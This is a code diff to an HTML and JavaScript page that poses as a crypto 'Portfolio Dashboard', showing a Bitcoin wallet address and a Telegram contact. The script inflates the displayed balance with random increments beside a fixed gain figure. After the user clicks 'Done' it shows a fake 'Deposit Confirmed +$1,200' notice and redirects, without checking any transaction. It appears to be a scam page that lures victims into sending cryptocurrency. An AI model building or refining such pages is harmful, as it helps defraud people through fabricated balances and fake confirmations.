@@ -82,20 +82,20 @@ footer {
     color: #94a3b8;
 }
 
-/* POPUP */
+/* TOAST */
 #toast {
     position: fixed;
     top: 20px;
     right: 20px;
-    background: rgba(34,197,94,0.95);
-    padding: 14px;
+    background: #22c55e;
+    padding: 12px;
     border-radius: 10px;
     display: none;
     z-index: 9999;
     font-weight: bold;
 }
 
-/* FULL SCREEN MODAL */
+/* MODAL */
 #modal {
     display: none;
     position: fixed;
@@ -114,7 +114,7 @@ footer {
     border: 1px solid #22c55e;
 }
 
-/* SPINNER */
+/* LOADING */
 #loading {
     display: none;
     position: fixed;
@@ -152,7 +152,7 @@ footer {
 
 <div id="modal">
     <div class="modal-box">
-        <h2>✅ New Deposit Confirmed</h2>
+        <h2>✅ Deposit Confirmed</h2>
         <p>Your transaction has been received successfully.</p>
     </div>
 </div>
@@ -173,7 +173,9 @@ footer {
 <div class="card">
     <h2>Portfolio Dashboard</h2>
 
-    <h3 id="portfolio">$12,850.00 <span style="color:#22c55e;">+12.4%</span></h3>
+    <h3 id="portfolio">
+        $12,850.00 <span style="color:#22c55e;">+12.4%</span>
+    </h3>
 </div>
 
 <!-- TRANSACTIONS -->
@@ -206,7 +208,14 @@ footer {
         bc1qrc4dz7k6zlth9nn4mx82qjnmyg6s3tty4up0mh
     </div>
 
-    <button onclick="simulateDeposit()">Simulate Deposit</button>
+    <button onclick="copyWallet()">Copy Wallet</button>
+    <button onclick="goToThankYou(this)">Done</button>
+</div>
+
+<!-- CONTACT (RESTORED) -->
+<div class="card">
+    <h2>Contact</h2>
+    <p>Telegram: @Ethervision35</p>
 </div>
 
 </div>
@@ -219,7 +228,8 @@ let portfolioValue = 12850;
 
 /* AUTO GROW PORTFOLIO */
 setInterval(() => {
-    portfolioValue += Math.floor(Math.random() * 80);
+    portfolioValue += Math.floor(Math.random() * 70);
+
     document.getElementById("portfolio").innerHTML =
         "$" + portfolioValue.toLocaleString() +
         ' <span style="color:#22c55e;">+12.4%</span>';
@@ -239,24 +249,29 @@ function showToast(msg) {
     setTimeout(() => t.style.display = "none", 4000);
 }
 
-/* FULL SCREEN POPUP + SOUND */
-function simulateDeposit() {
+/* COPY WALLET */
+function copyWallet() {
+    navigator.clipboard.writeText(document.getElementById("wallet").innerText);
+    showToast("Wallet copied!");
+}
+
+/* DONE BUTTON */
+function goToThankYou(btn) {
+    btn.disabled = true;
+    btn.innerText = "Processing...";
 
     document.getElementById("loading").style.display = "flex";
 
     setTimeout(() => {
-
         document.getElementById("loading").style.display = "none";
-
         document.getElementById("modal").style.display = "flex";
 
-        showToast("New deposit confirmed +$1,200");
-
         playSound();
+        showToast("Deposit confirmed +$1,200");
 
         setTimeout(() => {
-            document.getElementById("modal").style.display = "none";
-        }, 3000);
+            window.location.href = "thankyou.html";
+        }, 2500);
 
     }, 2000);
 }
